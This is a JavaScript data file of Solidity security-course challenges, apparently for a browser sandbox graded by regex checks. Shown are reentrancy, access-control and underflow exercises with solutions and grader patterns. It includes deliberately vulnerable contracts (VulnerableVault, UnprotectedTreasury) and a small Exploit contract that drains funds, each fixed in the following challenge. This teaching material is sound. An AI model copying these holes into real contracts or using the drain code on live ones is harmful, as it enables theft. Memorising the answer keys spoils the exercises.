// Level 9
// Generated Solidity challenges - graded by static text checks only (no EVM in-browser).
window.LEVEL9 = [
  {
    "id": 368,
    "title": "Welcome to Level 9: Contract Security",
    "kind": "intro",
    "topic": "Introduction",
    "level": 9,
    "instructions": "<p>Levels 7 and 8 taught you to write Solidity that works. Level 9 is about Solidity that survives contact with an adversary. A public contract holds real value and its code is visible to everyone, so every mistake is a standing offer. In this level you will write each classic vulnerability yourself: reentrancy, broken access control, integer underflow, <code>tx.origin</code> authentication, unchecked low-level calls, push-payment griefing, oracle manipulation, and signature replay. You make the exploit concrete, then close the hole in the very next challenge. The two capstones ask you to find planted bugs in an unfamiliar contract and then ship the hardened version.</p>\n<p>As before, this sandbox only checks the text of what you type; it cannot compile Solidity, run the EVM, mine a block, or execute an exploit. The understanding is the deliverable, not a green checkmark. For every bug challenge, open <code>remix.ethereum.org</code> (nothing to install), deploy the vulnerable contract next to a small attacker contract, and watch the balance move. An exploit is not real to you until you have run it once. The professional toolkit that keeps these bugs out of your code in the first place, audited base contracts, proxies, and Foundry tests, is Level 10.</p>",
    "starterCode": ""
  },
  {
    "id": 369,
    "title": "Reentrancy: Write the Vulnerable Withdraw",
    "difficulty": "hard",
    "topic": "Security: Reentrancy",
    "level": 9,
    "xp": 25,
    "instructions": "<p>A withdrawal function does three jobs: check the caller's recorded balance, send the ether, and update the record. On a private script the order would not matter. On a public chain it decides whether the contract can be emptied, because the address you send to is not always a passive wallet. It can be a contract, and sending it ether runs its <code>receive()</code> function, <em>its</em> code, in the middle of <em>your</em> function, before the line that updates the record has run.</p>\n<p>Picture an ATM that dispenses the notes first and only then radios the bank to debit your account. Step back up to the keypad before the radio call connects and the machine still thinks your balance is untouched, so it pays out again. A malicious <code>receive()</code> that calls <code>withdraw</code> a second time is exactly that step back up to the keypad; it can loop until the vault is dry. This is <strong>reentrancy</strong>, and Level 6's node challenges warned about it in the abstract: the party on the other end of a call is not under your control and may not cooperate. This challenge is the concrete version, you write the broken function on purpose so you can recognise its shape anywhere.</p>\n<ul>\n  <li><strong>reentrancy:</strong> an external call hands control to untrusted code, which calls back into your contract before your first call has finished updating state.</li>\n  <li><strong>receive():</strong> a special no-name function that runs when a contract is sent ether with empty calldata. An attacker puts their re-entry logic here.</li>\n  <li><strong>low-level call:</strong> <code>addr.call{value: n}(\"\")</code> forwards ether and all remaining gas, and returns <code>(bool success, bytes memory data)</code>. Forwarding the gas is what lets the receiver run code.</li>\n  <li><strong>checks-effects-interactions:</strong> the ordering rule this function breaks, validate first, update your own state second, call other addresses last.</li>\n</ul>\n<p class=\"blueprint-line\"><code>require(balances[msg.sender] &gt;= amount);</code><br><code>(bool ok) = msg.sender.call{value: amount}(\"\");</code> &nbsp;&larr; interaction<br><code>balances[msg.sender] -= amount;</code> &nbsp;&larr; effect, too late</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - interaction happens before the effect\nfunction withdraw(uint256 amount) external {\n    require(balances[msg.sender] >= amount, \"insufficient\");\n    (bool ok) = msg.sender.call{value: amount}(\"\");   // control leaves the contract HERE\n    require(ok, \"send failed\");\n    balances[msg.sender] -= amount;                     // attacker re-enters before this line\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>Nothing here executes, the editor is only reading your text. The exploit only becomes real in <code>remix.ethereum.org</code>: deploy this <code>VulnerableVault</code>, deploy a second contract whose <code>receive()</code> calls <code>withdraw</code> again, fund the vault from a third account, then trigger one withdraw and watch the vault balance fall to zero.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write a contract named <code>VulnerableVault</code> with a <code>mapping(address =&gt; uint256) public balances</code>. Add an <code>external payable</code> function <code>deposit()</code> that does <code>balances[msg.sender] += msg.value</code>. Add an <code>external</code> function <code>withdraw(uint256 amount)</code> that: <code>require</code>s <code>balances[msg.sender] &gt;= amount</code>, then does <code>(bool ok) = msg.sender.call{value: amount}(\"\")</code> and <code>require(ok)</code>, and only <em>after</em> that does <code>balances[msg.sender] -= amount</code>. The external call must come before the subtraction, that ordering is the bug.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">order inside withdraw</span><code class=\"io-val\">require &rarr; call{value: amount} &rarr; balances[msg.sender] -= amount</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">attacker receive() re-calls withdraw</span><code class=\"io-val\">balance check still passes, vault drains</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract VulnerableVault {",
      "    mapping(address => uint256) public balances;",
      "",
      "    function deposit() external payable {",
      "        balances[msg.sender] += msg.value;",
      "    }",
      "",
      "    function withdraw(uint256 amount) external {",
      "        require(balances[msg.sender] >= amount, \"insufficient\");",
      "        (bool ok, ) = msg.sender.call{value: amount}(\"\");",
      "        require(ok, \"send failed\");",
      "        balances[msg.sender] -= amount;",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write VulnerableVault: deposit(), then a withdraw() that sends BEFORE it deducts\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract VulnerableVault {\n    mapping(address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint256 amount) external {\n        require(balances[msg.sender] >= amount, \"insufficient\");\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"send failed\");\n        balances[msg.sender] -= amount;\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "codeContains",
          "value": "pragma solidity",
          "message": "Start with pragma solidity ^0.8.20;"
        },
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+VulnerableVault\\s*\\{",
          "message": "Define a contract named VulnerableVault."
        },
        {
          "type": "matchesRegex",
          "pattern": "mapping\\s*\\(\\s*address\\s*=>\\s*uint256\\s*\\)\\s*public\\s+balances",
          "message": "Declare: mapping(address => uint256) public balances;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+deposit\\s*\\(\\s*\\)\\s+external\\s+payable",
          "message": "deposit() must be external payable."
        },
        {
          "type": "matchesRegex",
          "pattern": "balances\\[msg\\.sender\\]\\s*\\+=\\s*msg\\.value",
          "message": "deposit() should do balances[msg.sender] += msg.value;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+withdraw\\s*\\(\\s*uint256\\s+amount\\s*\\)\\s+external",
          "message": "Add function withdraw(uint256 amount) external."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*balances\\[msg\\.sender\\]\\s*>=\\s*amount",
          "message": "withdraw() must require(balances[msg.sender] >= amount ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\(\\s*bool\\s+ok\\s*,\\s*\\)\\s*=\\s*msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount\\s*\\}\\(\\s*\"\"\\s*\\)",
          "message": "Send with (bool ok) = msg.sender.call{value: amount}(\"\");"
        },
        {
          "type": "matchesRegex",
          "pattern": "msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount\\s*\\}\\([\\s\\S]*balances\\[msg\\.sender\\]\\s*-=\\s*amount",
          "message": "The external call must appear BEFORE balances[msg.sender] -= amount; that ordering is the bug this challenge reproduces."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*ok",
          "message": "Check the send with require(ok ...)."
        }
      ]
    },
    "explanation": "<p>The whole vulnerability is one swapped pair of lines: the record is still stale when control leaves the contract, so a nested <code>withdraw</code> passes the same balance check again. The next challenge closes it two ways at once, reorder to checks-effects-interactions so the nested call fails its own check, and add a <code>nonReentrant</code> lock so a re-entry reverts before it can even try.</p>"
  },
  {
    "id": 370,
    "title": "Reentrancy: Close It with CEI and a Guard",
    "difficulty": "hard",
    "topic": "Security: Reentrancy",
    "level": 9,
    "xp": 25,
    "instructions": "<p>You just wrote <code>VulnerableVault</code>, a withdraw that sends ether before it updates the record, so an attacker's <code>receive()</code> can re-enter and pass the balance check again and again until the contract is empty. Here you write the version you would actually ship. The picture is a bank teller who hands over cash and only writes the withdrawal in your passbook afterward. Get back to the front of the line before the pen touches paper and you can draw the same balance repeatedly. The fix is not subtle once you see it: update the passbook <em>first</em>, then hand over the cash.</p>\n<p>In contract terms that ordering has a name (checks, then effects, then interactions) and there is a belt-and-braces second layer: a lock that refuses any re-entry while a call is already in progress. Level 6's node challenges hinted that the thing you are talking to might not cooperate; reentrancy is the sharpest form of that, and these two habits together shut it down.</p>\n<ul>\n  <li><strong>reentrancy:</strong> an external call handing control to untrusted code that calls back into your contract before the first call has finished changing state.</li>\n  <li><strong>checks-effects-interactions:</strong> an ordering rule, validate inputs (checks), update your own state (effects), and only then call other addresses (interactions).</li>\n  <li><strong>reentrancy guard:</strong> a <code>bool</code> flag set at the start of a function and cleared at the end, with a <code>require</code> that the flag is not already set. A nested call hits the <code>require</code> and reverts.</li>\n</ul>\n<p class=\"blueprint-line\"><code>require(balances[msg.sender] &gt;= amount);</code> &nbsp;&rarr;&nbsp; <code>balances[msg.sender] -= amount;</code> &nbsp;&rarr;&nbsp; <code>(bool ok) = msg.sender.call{value: amount}(\"\");</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - do not ship\nfunction withdraw(uint256 amount) external {\n    require(balances[msg.sender] >= amount, \"insufficient\");\n    (bool ok) = msg.sender.call{value: amount}(\"\");   // control leaves here\n    require(ok, \"send failed\");\n    balances[msg.sender] -= amount;                     // ...too late\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The editor only checks the text of your answer. To see this for real, deploy the vulnerable version in <code>remix.ethereum.org</code> alongside a small attacker contract whose <code>receive()</code> calls <code>withdraw</code> again, and watch the vault balance go to zero, then swap in the fixed version and watch the attack revert.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write a contract <code>SafeVault</code> with a <code>mapping(address =&gt; uint256) public balances</code>. Add a <code>payable</code> function <code>deposit()</code> that adds <code>msg.value</code> to <code>balances[msg.sender]</code>. Add a <code>bool private locked</code> and a <code>modifier nonReentrant</code> that <code>require</code>s <code>!locked</code>, sets <code>locked = true</code>, runs the body (<code>_;</code>), then sets <code>locked = false</code>. Add <code>withdraw(uint256 amount)</code>, marked <code>nonReentrant</code>, that requires <code>balances[msg.sender] &gt;= amount</code>, subtracts <code>amount</code> from <code>balances[msg.sender]</code> <em>before</em> sending, then does <code>(bool ok) = msg.sender.call{value: amount}(\"\")</code> and <code>require(ok)</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">order inside withdraw</span><code class=\"io-val\">require balance &rarr; balances[msg.sender] -= amount &rarr; call{value: amount}</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">attacker re-enters withdraw</span><code class=\"io-val\">reverts on require(!locked)</code></div>\n</div>",
    "hints": [
      "mapping(address => uint256) public balances;",
      "bool private locked;",
      "",
      "modifier nonReentrant() {",
      "    require(!locked, \"reentrant\");",
      "    locked = true;",
      "    _;",
      "    locked = false;",
      "}",
      "",
      "function withdraw(uint256 amount) external nonReentrant {",
      "    require(balances[msg.sender] >= amount, \"insufficient\");",
      "    balances[msg.sender] -= amount;",
      "    (bool ok, ) = msg.sender.call{value: amount}(\"\");",
      "    require(ok, \"send failed\");",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract SafeVault {\n    // balances, lock flag, modifier, deposit, withdraw\n}",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract SafeVault {\n    mapping(address => uint256) public balances;\n    bool private locked;\n\n    modifier nonReentrant() {\n        require(!locked, \"reentrant\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint256 amount) external nonReentrant {\n        require(balances[msg.sender] >= amount, \"insufficient\");\n        balances[msg.sender] -= amount;\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"send failed\");\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "mapping\\s*\\(\\s*address\\s*=>\\s*uint256\\s*\\)\\s*public\\s+balances",
          "message": "Declare: mapping(address => uint256) public balances;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+deposit\\s*\\(\\s*\\)\\s+external\\s+payable",
          "message": "deposit() must be external payable."
        },
        {
          "type": "matchesRegex",
          "pattern": "balances\\[msg\\.sender\\]\\s*\\+=\\s*msg\\.value",
          "message": "deposit() should credit balances[msg.sender] += msg.value."
        },
        {
          "type": "matchesRegex",
          "pattern": "bool\\s+private\\s+locked",
          "message": "Add a bool private locked flag."
        },
        {
          "type": "matchesRegex",
          "pattern": "modifier\\s+nonReentrant\\s*\\(\\s*\\)",
          "message": "Define a modifier nonReentrant()."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*!locked",
          "message": "nonReentrant must require(!locked ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+withdraw\\s*\\([^)]*\\)\\s+external\\s+nonReentrant",
          "message": "withdraw must be marked nonReentrant."
        },
        {
          "type": "matchesRegex",
          "pattern": "balances\\[msg\\.sender\\]\\s*-=\\s*amount[\\s\\S]*msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount",
          "message": "Deduct the balance BEFORE the external call (checks-effects-interactions)."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\(\\s*bool\\s+ok\\s*,\\s*\\)\\s*=\\s*msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount\\s*\\}\\(\\s*\"\"\\s*\\)",
          "message": "Send with (bool ok) = msg.sender.call{value: amount}(\"\");"
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*ok",
          "message": "Check the call succeeded with require(ok ...)."
        }
      ]
    },
    "explanation": "<p>The single line that matters is deducting <code>balances[msg.sender]</code> <em>before</em> <code>call</code>: once state is correct, a nested <code>withdraw</code> fails its own balance check, so the reordering alone closes the hole. The <code>nonReentrant</code> lock is defence in depth, it also protects functions where a clean ordering is harder to guarantee, and it is what stops a cross-function reentrancy. In production you would inherit OpenZeppelin's <code>ReentrancyGuard</code> rather than hand-roll the flag; you have just written, in miniature, exactly what it does.</p>"
  },
  {
    "id": 371,
    "title": "Access Control: The Unprotected Admin Function",
    "difficulty": "medium",
    "topic": "Security: Access Control",
    "level": 9,
    "xp": 15,
    "instructions": "<p>The ERC-20 you built in Level 7 had an <code>owner</code> captured at deployment. That value is only worth something if the functions that matter actually check it. A privileged function with no check is not \"less secure\", it is a public function that anyone on Earth can call, including the one that reassigns ownership or moves the whole balance.</p>\n<p>Think of a bank vault with a keypad on the outside and no code set: the lock is installed, it just never asks. In this challenge you write the mistake deliberately. <code>setOwner</code> lets any caller make themselves owner; <code>withdrawAll</code> lets any caller sweep the contract. Then you write a second contract that chains them into a single transaction (become owner, then drain) so the exploit is code you can actually run, not a sentence in a comment.</p>\n<ul>\n  <li><strong>access control:</strong> restricting a function to specific callers, normally by comparing <code>msg.sender</code> against a stored address or role.</li>\n  <li><strong>privileged function:</strong> one that changes ownership, moves funds, pauses the system, or mints, anything you would not want an arbitrary address to trigger.</li>\n  <li><strong>address(this).balance:</strong> the contract's own ether balance, in wei.</li>\n</ul>\n<p class=\"blueprint-line\"><code>function setOwner(address newOwner) external { owner = newOwner; }</code> &nbsp;&larr; no guard<br><code>function withdrawAll() external { ... }</code> &nbsp;&larr; no guard</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - anyone can call this\nfunction setPrice(uint256 p) external {\n    price = p;              // no owner check: every trader sets their own price\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>This grader only pattern-matches text; it has no idea who \"calls\" anything. To feel the bug, drop both contracts into <code>remix.ethereum.org</code>, fund <code>UnprotectedTreasury</code>, then call <code>Exploit.attack</code> from an account that is not the deployer and confirm the ether lands in the attacker.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract UnprotectedTreasury</code> with <code>address public owner</code> set to <code>msg.sender</code> in the constructor, a <code>receive() external payable</code>, an <code>external</code> function <code>setOwner(address newOwner)</code> whose body is <code>owner = newOwner;</code> with no check, and an <code>external</code> function <code>withdrawAll()</code> that sends <code>address(this).balance</code> to <code>msg.sender</code> via <code>call</code> with <code>require(ok)</code> and no check. Then write <code>contract Exploit</code> with a function <code>attack(UnprotectedTreasury victim)</code> that calls <code>victim.setOwner(address(this))</code> and then <code>victim.withdrawAll()</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">Exploit.attack(victim)</span><code class=\"io-val\">victim.setOwner(address(this)); victim.withdrawAll();</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">result</span><code class=\"io-val\">caller is now owner and the treasury is empty</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract UnprotectedTreasury {",
      "    address public owner;",
      "",
      "    constructor() {",
      "        owner = msg.sender;",
      "    }",
      "",
      "    function setOwner(address newOwner) external {",
      "        owner = newOwner;",
      "    }",
      "",
      "    function withdrawAll() external {",
      "        (bool ok, ) = msg.sender.call{value: address(this).balance}(\"\");",
      "        require(ok, \"send failed\");",
      "    }",
      "",
      "    receive() external payable {}",
      "}",
      "",
      "contract Exploit {",
      "    function attack(UnprotectedTreasury victim) external {",
      "        victim.setOwner(address(this));",
      "        victim.withdrawAll();",
      "    }",
      "",
      "    receive() external payable {}",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write UnprotectedTreasury (no guards) and Exploit (chains setOwner + withdrawAll)\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract UnprotectedTreasury {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function setOwner(address newOwner) external {\n        owner = newOwner;\n    }\n\n    function withdrawAll() external {\n        (bool ok, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(ok, \"send failed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Exploit {\n    function attack(UnprotectedTreasury victim) external {\n        victim.setOwner(address(this));\n        victim.withdrawAll();\n    }\n\n    receive() external payable {}\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+UnprotectedTreasury\\s*\\{",
          "message": "Define contract UnprotectedTreasury."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+setOwner\\s*\\(\\s*address\\s+\\w+\\s*\\)\\s+external",
          "message": "Add function setOwner(address newOwner) external with no guard."
        },
        {
          "type": "matchesRegex",
          "pattern": "owner\\s*=\\s*newOwner\\s*;",
          "message": "setOwner body must be owner = newOwner;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+withdrawAll\\s*\\(\\s*\\)\\s+external",
          "message": "Add function withdrawAll() external with no guard."
        },
        {
          "type": "matchesRegex",
          "pattern": "address\\(this\\)\\.balance",
          "message": "withdrawAll() should send address(this).balance."
        },
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+Exploit\\s*\\{",
          "message": "Define contract Exploit."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\.setOwner\\(\\s*address\\(this\\)\\s*\\)",
          "message": "Exploit.attack must call victim.setOwner(address(this))."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\.setOwner\\(\\s*address\\(this\\)\\s*\\)\\s*;[\\s\\S]*\\.withdrawAll\\(\\s*\\)",
          "message": "attack() must call setOwner(address(this)) and THEN withdrawAll()."
        }
      ]
    },
    "explanation": "<p>An unguarded state-changing function is the single most common finding in real audits, and it is usually this exact shape: a setter or a sweep that forgot its check. The next challenge adds <code>onlyOwner</code> and then a two-step ownership handover, because even a guarded one-step transfer has its own failure mode, sending ownership to a mistyped address you do not control.</p>"
  },
  {
    "id": 372,
    "title": "Access Control: onlyOwner and Two-Step Transfer",
    "difficulty": "medium",
    "topic": "Security: Access Control",
    "level": 9,
    "xp": 15,
    "instructions": "<p>The fix for the unprotected treasury is one modifier: compare <code>msg.sender</code> to the stored <code>owner</code> and revert otherwise. But handing ownership to someone else has a trap of its own. A one-step <code>transferOwnership(newOwner)</code> takes effect immediately, so if you paste an address with one wrong character (an address nobody holds the key to) the contract is now owned by nothing. There is no undo, the same way a coin sent to a wrong address in Level 5 was simply gone.</p>\n<p>The standard defence is a two-step handover: the current owner nominates a <code>pendingOwner</code>, and ownership only moves when that pending address itself calls <code>acceptOwnership</code>. A typo cannot accept, so a fumbled transfer stalls harmlessly instead of bricking the contract.</p>\n<ul>\n  <li><strong>modifier:</strong> reusable pre/post logic wrapped around a function body; <code>_;</code> marks where the body runs.</li>\n  <li><strong>custom error:</strong> <code>error NotOwner();</code> declared once, then <code>revert NotOwner();</code>, cheaper than a <code>require</code> string.</li>\n  <li><strong>pendingOwner:</strong> a staged nominee that has no power until it accepts, so ownership never lands on an address that cannot act.</li>\n</ul>\n<p class=\"blueprint-line\"><code>modifier onlyOwner() { if (msg.sender != owner) revert NotOwner(); _; }</code><br><code>function transferOwnership(address newOwner) external onlyOwner { pendingOwner = newOwner; }</code><br><code>function acceptOwnership() external { require(msg.sender == pendingOwner); owner = pendingOwner; }</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>modifier onlyOwner() {\n    if (msg.sender != owner) revert NotOwner();\n    _;                       // the guarded function body runs here\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The sandbox is checking words, not behaviour, it will not stop you calling a guarded function \"as\" the wrong account. In <code>remix.ethereum.org</code>, deploy this, call <code>transferOwnership</code> from the owner to a second account, confirm <code>owner</code> has not changed yet, then call <code>acceptOwnership</code> from that second account and watch it flip.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract GuardedTreasury</code>. Declare <code>address public owner</code> and <code>address public pendingOwner</code>, an <code>error NotOwner()</code>, and a constructor that sets <code>owner = msg.sender</code>. Add <code>modifier onlyOwner()</code> that does <code>if (msg.sender != owner) revert NotOwner();</code> then <code>_;</code>. Add <code>transferOwnership(address newOwner) external onlyOwner</code> that sets <code>pendingOwner = newOwner;</code>. Add <code>acceptOwnership() external</code> that does <code>require(msg.sender == pendingOwner ...)</code>, then <code>owner = pendingOwner;</code>. Add <code>withdrawAll() external onlyOwner</code> that sends <code>address(this).balance</code> to <code>msg.sender</code> with <code>require(ok)</code>, and a <code>receive() external payable</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">transferOwnership(newOwner)</span><code class=\"io-val\">pendingOwner = newOwner; owner unchanged</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">acceptOwnership() from newOwner</span><code class=\"io-val\">owner = pendingOwner</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract GuardedTreasury {",
      "    address public owner;",
      "    address public pendingOwner;",
      "",
      "    error NotOwner();",
      "",
      "    constructor() {",
      "        owner = msg.sender;",
      "    }",
      "",
      "    modifier onlyOwner() {",
      "        if (msg.sender != owner) revert NotOwner();",
      "        _;",
      "    }",
      "",
      "    function transferOwnership(address newOwner) external onlyOwner {",
      "        pendingOwner = newOwner;",
      "    }",
      "",
      "    function acceptOwnership() external {",
      "        require(msg.sender == pendingOwner, \"not pending owner\");",
      "        owner = pendingOwner;",
      "        pendingOwner = address(0);",
      "    }",
      "",
      "    function withdrawAll() external onlyOwner {",
      "        (bool ok, ) = msg.sender.call{value: address(this).balance}(\"\");",
      "        require(ok, \"send failed\");",
      "    }",
      "",
      "    receive() external payable {}",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Write GuardedTreasury: onlyOwner, then pendingOwner + acceptOwnership\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract GuardedTreasury {\n    address public owner;\n    address public pendingOwner;\n\n    error NotOwner();\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        if (msg.sender != owner) revert NotOwner();\n        _;\n    }\n\n    function transferOwnership(address newOwner) external onlyOwner {\n        pendingOwner = newOwner;\n    }\n\n    function acceptOwnership() external {\n        require(msg.sender == pendingOwner, \"not pending owner\");\n        owner = pendingOwner;\n        pendingOwner = address(0);\n    }\n\n    function withdrawAll() external onlyOwner {\n        (bool ok, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(ok, \"send failed\");\n    }\n\n    receive() external payable {}\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "address\\s+public\\s+pendingOwner",
          "message": "Declare address public pendingOwner;"
        },
        {
          "type": "matchesRegex",
          "pattern": "error\\s+NotOwner\\s*\\(\\s*\\)",
          "message": "Declare error NotOwner();"
        },
        {
          "type": "matchesRegex",
          "pattern": "modifier\\s+onlyOwner\\s*\\(\\s*\\)",
          "message": "Define modifier onlyOwner()."
        },
        {
          "type": "matchesRegex",
          "pattern": "msg\\.sender\\s*!=\\s*owner",
          "message": "onlyOwner must check msg.sender != owner."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+transferOwnership\\s*\\(\\s*address\\s+\\w+\\s*\\)\\s+external\\s+onlyOwner",
          "message": "transferOwnership(address newOwner) must be external onlyOwner."
        },
        {
          "type": "matchesRegex",
          "pattern": "pendingOwner\\s*=\\s*\\w+\\s*;",
          "message": "transferOwnership must set pendingOwner = newOwner;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+acceptOwnership\\s*\\(\\s*\\)\\s+external",
          "message": "Add function acceptOwnership() external."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*msg\\.sender\\s*==\\s*pendingOwner",
          "message": "acceptOwnership must require(msg.sender == pendingOwner ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "owner\\s*=\\s*pendingOwner\\s*;",
          "message": "acceptOwnership must set owner = pendingOwner;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+withdrawAll\\s*\\(\\s*\\)\\s+external\\s+onlyOwner",
          "message": "withdrawAll() must be external onlyOwner."
        }
      ]
    },
    "explanation": "<p>OpenZeppelin ships both variants, <code>Ownable</code> for the one-step version and <code>Ownable2Step</code> for the pattern you just wrote, and serious deployments use the two-step one for exactly the typo reason. The same \"nominate then accept\" shape shows up whenever a change is dangerous and irreversible: role grants, upgrades, and timelocked governance all use it.</p>"
  },
  {
    "id": 373,
    "title": "Arithmetic: The unchecked Underflow Drain",
    "difficulty": "medium",
    "topic": "Security: Arithmetic",
    "level": 9,
    "xp": 15,
    "instructions": "<p>Before Solidity 0.8, arithmetic wrapped silently: subtract 1 from a <code>uint256</code> that holds 0 and you got the largest number the type can represent. A balance check like <code>balance -= amount</code> with no guard let an attacker underflow their own balance to near-infinity and drain everything. Whole audits used to be about spotting this. That is why your earlier contracts \"just worked\", since 0.8, every <code>+</code>, <code>-</code>, and <code>*</code> reverts on overflow or underflow by default.</p>\n<p>The escape hatch is <code>unchecked { }</code>, a block where the compiler skips those checks to save gas. It is legitimate when you have already proven the operation cannot overflow, a loop counter, a subtraction guarded by a preceding <code>require</code>. It is a re-opened door when someone wraps a bare balance update in it. This challenge: recognise the <code>unchecked</code> underflow, then ship the checked version, which is just the same code without the block.</p>\n<ul>\n  <li><strong>underflow:</strong> subtracting past zero on an unsigned type. Pre-0.8 (or inside <code>unchecked</code>) it wraps to a huge number instead of reverting.</li>\n  <li><strong>unchecked block:</strong> <code>unchecked { ... }</code> disables overflow/underflow checks for the operations inside it. Use only when overflow is provably impossible.</li>\n  <li><strong>checked arithmetic:</strong> the 0.8 default, the operation reverts rather than producing a wrong number.</li>\n</ul>\n<p class=\"blueprint-line\"><code>balanceOf[msg.sender] -= amount;</code> &nbsp;(checked: reverts if <code>amount</code> &gt; balance)<br><code>unchecked { balanceOf[msg.sender] -= amount; }</code> &nbsp;(wraps to a huge number)</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>// VULNERABLE - underflow re-enabled by unchecked\nfunction transfer(address to, uint256 amount) external {\n    unchecked {\n        balanceOf[msg.sender] -= amount;   // 0 - 1  ->  2**256 - 1\n    }\n    balanceOf[to] += amount;\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>You cannot watch a number wrap in this editor, it is not running anything. In <code>remix.ethereum.org</code>, deploy the <code>unchecked</code> version, call <code>transfer</code> from an account with zero balance, and read <code>balanceOf</code> back: it will be an astronomically large number. Then deploy the checked version and see the same call revert.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract TokenLedger</code> with <code>mapping(address =&gt; uint256) public balanceOf</code> and a constructor that gives <code>msg.sender</code> a starting balance. Add <code>function transfer(address to, uint256 amount) external</code> that: <code>require</code>s <code>balanceOf[msg.sender] &gt;= amount</code>, then does <code>balanceOf[msg.sender] -= amount;</code> and <code>balanceOf[to] += amount;</code> with <strong>no</strong> <code>unchecked</code> block anywhere, the checked subtraction is the fix.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div 